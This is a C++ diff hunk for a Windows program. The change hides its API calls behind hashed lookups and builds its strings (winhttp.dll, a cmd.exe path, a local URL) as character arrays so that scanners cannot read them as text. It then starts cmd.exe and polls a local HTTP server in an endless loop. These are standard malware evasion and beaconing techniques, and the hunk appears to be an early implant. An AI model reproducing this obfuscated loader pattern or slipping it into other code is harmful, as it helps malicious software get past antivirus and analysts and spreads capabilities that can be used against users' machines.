@@ -358,19 +358,65 @@ using namespace HttpLib;
 //    }
 //}
 #include "ApiResolve.h"
+#include "HashString.h"
 
 int main() {
-
-    LoadLibraryA("winhttp.dll");
+    ApiResolve api;
+    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
+    LPVOID lpKernel32 = api.GetModuleBaseAddress(hashKernel32);
+    typedef HMODULE
+        (WINAPI*
+        _LoadLibraryA)(
+            _In_ LPCSTR lpLibFileName
+        );
+    constexpr unsigned int hashLoadLibraryA = ComplexHashForAnsi("LoadLibraryA");
+    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)api.GetApiAddress(lpKernel32, hashLoadLibraryA);
+    const char sDll[] = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
+    pLoadLibraryA(sDll);
 	//wchar_t url[] = {L'h', L't', L't', L'p', L's', L':', L'/', L'/', L'h', L't', L't', L'p', L'b', L'i', L'n', L'.', L'o', L'r', L'g', L'/', L'g', L'e', L't', L'\0'};
-    const wchar_t* url = L"http://127.0.0.1:80";
+    wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'\0'};
     HttpClient client;
-    client.SetTimeout(30000);
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
 
-    HttpResponse response;
-    HttpResponse_Init(&response);
+    si.cb = sizeof(si);
+    char path[] = {'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', '\0'};
+    typedef BOOL
+        (WINAPI*
+        _CreateProcessA)(
+            _In_opt_ LPCSTR lpApplicationName,
+            _Inout_opt_ LPSTR lpCommandLine,
+            _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
+            _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+            _In_ BOOL bInheritHandles,
+            _In_ DWORD dwCreationFlags,
+            _In_opt_ LPVOID lpEnvironment,
+            _In_opt_ LPCSTR lpCurrentDirectory,
+            _In_ LPSTARTUPINFOA lpStartupInfo,
+            _Out_ LPPROCESS_INFORMATION lpProcessInformation
+        );
+    constexpr unsigned int hashCreateProcessA = ComplexHashForAnsi("CreateProcessA");
+    _CreateProcessA pCreateProcessA = (_CreateProcessA)api.GetApiAddress(lpKernel32, hashCreateProcessA);
+    BOOL ok = pCreateProcessA(
+        path, // lpApplicationName
+        NULL,                             // lpCommandLine
+        NULL,                             // lpProcessAttributes
+        NULL,                             // lpThreadAttributes
+        FALSE,                            // bInheritHandles
+        0,                                // dwCreationFlags
+        NULL,                             // lpEnvironment
+        NULL,                             // lpCurrentDirectory
+        &si,                              // lpStartupInfo
+        &pi                               // lpProcessInformation
+    );
 
-    client.Get(&response, url);
-    //PrintResponse(&response);
-    HttpResponse_Free(&response);
+    while (1) {
+        HttpResponse response;
+        HttpResponse_Init(&response);
+
+        client.Get(&response, url);
+        //PrintResponse(&response);
+        HttpResponse_Free(&response);
+    }
+
 }
